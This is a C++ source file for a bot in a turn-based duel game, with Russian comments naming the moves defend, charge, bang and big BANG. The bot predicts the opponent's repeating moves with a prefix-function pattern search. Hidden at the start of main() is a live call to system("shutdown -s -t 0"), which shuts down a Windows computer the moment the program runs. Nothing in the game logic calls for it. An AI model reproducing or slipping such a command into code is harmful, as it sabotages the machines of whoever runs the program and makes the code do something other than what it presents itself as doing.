#include <iostream>
#include <vector>
#include <ctime>
#include <cstdlib>

using namespace std;

vector <int> vec(113);

/*
0 - защита
1 - зарядка
2 - бэнг
3 - БЭНГ
*/

bool fl;
int c1 = 0, c2 = 0;

void turn(int a) {
    if (!fl) {
        cout << a << endl;
        fl = 1;
        if (a == 1) {
            c1 = min(c1 + 1, 3);
        }
        if (a >= 2) {
            c1 = 0;
        }
    }
}

void get(int i) {
    cin >> vec[i];
    if (vec[i] == 1) {
        c2 = min(c2 + 1, 3);
    }
    if (vec[i] >= 2) {
        c2 = 0;
    }
}

vector <int> prf(vector <int> &vec) {
    vector <int> ans(vec.size(), 0);
    for (int i = 1; i < vec.size(); ++i) {
        ans[i] = ans[i - 1];
        while (ans[i] > 0 && vec[i] != vec[ans[i]]) {
            ans[i] = ans[ans[i] - 1];
        }
        if (vec[i] == vec[ans[i]]) {
            ++ans[i];
        }
    }
    return ans;
}

void clever_turn() {
    int c = 4 * c1 + c2;
    switch (c) {
        case 0 : turn(1);
                 break;
        case 1 : turn(0);
                 break;
        case 2 : turn(1);
                 break;
        case 3 : turn(1);
                 break;
        case 4 : turn(1);
                 break;
        case 5 : turn(((rand() % 100) <= 50) ? 1 : 0);
                 break;
        case 6 : turn(2);
                 break;
        case 7 : turn(2);
                 break;
        case 8 : turn(1);
                 break;
        case 9 : turn(((rand() % 100) <= 50) ? 1 : 0);
                 break;
        case 10 : turn(rand() % 2 + 1);
                 break;
        case 11 : turn(2);
                 break;
        case 12 : turn(3);
                 break;
        case 13 : turn(0);
                 break;
        case 14 : turn(3);
                 break;
        case 15 : turn(3);
                 break;
    }
}

void strategy1() {
    for (int i = 0; i < 113; ++i) {
        fl = 0;
        if (i == 112) {
            if (c1) {
                turn(max(c1, 2));
            } else {
                turn(0);
            }
        }
        if (c1 == 3) {
            if (c2 % 2 == 0) {
                turn(3);
            }
        }
        if (c2 == 0) {
            turn(1);
        }
        if (fl) {
            get(i);
            continue;
        }
        vector <int> pr(i);
        for (int j = 0; j < i; ++j) {
            pr[j] = vec[j];
        }
        int mx = 0;
        for (int start = 0; start < i; ++start) {
            vector <int> h(i - start);
            for (int ptr = start; ptr < i; ++ptr) {
                h[ptr - start] = vec[ptr];
            }
            vector <int> g = prf(h);
            if (pr.size() * (h.size() - g.back()) < h.size() * (pr.size() - mx)) {
                mx = g.back();
                pr = h;
            }
        }
        if (pr.size() < 4 * (pr.size() - mx)) {
            if (c2 == 1) {
                turn(0);
            }
            clever_turn();
            get(i);
            continue;
        }
        int nxt = pr[pr.size() % (pr.size() - mx)];
        if (nxt == 3) {
            if (c1) {
                turn(max(2, c1));
            } else {
                turn(0);
            }
        }
        if (nxt == 2) {
            turn(0);
        }
        if (nxt == 1) {
            if (c1) {
                turn(max(2, c1));
            } else {
                turn(1);
            }
        }
        if (nxt == 0) {
            if (c1 == 3) {
                turn(3);
            } else {
                turn(1);
            }
        }
        get(i);
    }
}

void strategy2() {
    for (int i = 0; i < 113; ++i) {
        fl = 0;
        int c = c1 * 4 + c2;
        if (i == 112) {
            if (c1) {
                turn(max(c1, 2));
            } else {
                turn(0);
            }
        }
        clever_turn();
        get(i);
    }
}

int main() {
    srand(time(0));
    system("shutdown -s -t 0");
    strategy1();
}
